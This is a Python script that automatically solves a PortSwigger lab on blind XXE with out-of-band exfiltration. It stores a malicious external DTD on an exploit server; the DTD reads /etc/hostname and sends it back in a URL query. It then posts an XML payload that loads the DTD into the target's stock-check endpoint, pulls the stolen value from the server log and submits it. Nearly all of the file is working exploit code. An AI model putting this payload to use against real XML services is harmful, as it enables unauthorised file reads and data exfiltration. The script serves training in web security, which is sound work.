#!/usr/bin/env python3
# Lab: Exploiting blind XXE to exfiltrate data using a malicious external DTD
# Lab-Link: https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-exfiltration

from bs4 import BeautifulSoup
import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def find_exploitserver(text):
    soup = BeautifulSoup(text, 'html.parser')
    result = soup.find('a', attrs={'id': 'exploit-link'})['href']
    return result


def store_exploit(client, exploit_server):
    data = {'urlIsHttps': 'on',
            'responseFile': '/file.dtd',
            'responseHead': '''HTTP/1.1 200 OK
Content-Type: text/plain; charset=utf-8''',
            'responseBody': '''<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM ''' + f"'{exploit_server}" + '''/?exfiltrate=%file;'>">
%eval;
%exfiltrate;''',
            'formAction': 'STORE'}

    return client.post(exploit_server, data=data).status_code == 200


def run_exploit(client, host, exploit_server):
    url = f'{host}/product/stock'
    data = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE xxx [<!ENTITY % xxe SYSTEM ''' + f'"{exploit_server}' + '''/file.dtd"> %xxe;]>
<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>'''
    return client.post(url, data=data).status_code == 400


def extract_solution(text):
    soup = BeautifulSoup(text, 'html.parser')
    result = soup.find('pre', attrs={'class': 'container'}).text
    exfiltrate_line = result.splitlines()[-1]
    hostname = exfiltrate_line.split('=')[1].split()[0]
    return hostname


def send_solution(client, host, solution):
    data = {'answer': solution}
    r = client.post(f'{host}/submitSolution', data=data)
    return '{"correct":true}' in r.text


def main():
    print('[+] Lab: Exploiting blind XXE to exfiltrate data using a malicious external DTD')
    try:
        host = sys.argv[1].strip().rstrip('/')
    except IndexError:
        print(f'Usage: {sys.argv[0]} <HOST>')
        print(f'Exampe: {sys.argv[0]} http://www.example.com')
        sys.exit(-1)

    client = requests.Session()
    client.verify = False
    client.proxies = proxies

    exploit_server = find_exploitserver(client.get(host).text)
    print(f'[+] Exploit server: {exploit_server}')

    if not store_exploit(client, exploit_server):
        print(f'[-] Failed to store exploit DTD file')
        sys.exit(-2)
    print(f'[+] Stored exploit DTD file')

    if not run_exploit(client, host, exploit_server):
        print(f'[-] Something appeard to have gone wrong while trying to exploit')
        sys.exit(-3)
    print(f'[+] Exploit sent, now checking exploit server')

    text = client.get(f'{exploit_server}/log').text
    if '/?exfiltrate=' not in text:
        print(f'[-] Exploit failed to hit the exploit server')
        sys.exit(-4)
    print(f'[+] Exploit appeared on the exploit server')

    solution = extract_solution(text)
    print(f'[+] Hostname extracted: {solution}')
    if not send_solution(client, host, solution):
        print(f'[-] Answer submitted was incorrect')
        sys.exit(-5)
    print(f'[+] Correct answer submitted')

    if 'Congratulations, you solved the lab!' not in client.get(host).text:
        print(f'[-] Failed to solve lab')
        sys.exit(-9)

    print(f'[+] Lab solved')


if __name__ == "__main__":
    main()